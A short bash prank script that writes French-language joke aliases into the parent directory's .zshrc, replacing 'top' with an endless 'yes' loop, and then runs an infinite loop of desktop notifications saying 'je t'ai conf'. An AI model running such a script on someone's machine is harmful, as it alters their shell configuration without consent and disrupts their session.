#!/bin/bash

echo alias top="'yes nop interdit'" >> ../.zshrc
echo alias 1="'top'" >> ../.zshrc
echo alias 2="'notify-send test comment '" >> ../.zshrc
cd ..
source .zshrc
while true; do
    notify-send "je t'ai conf"
done
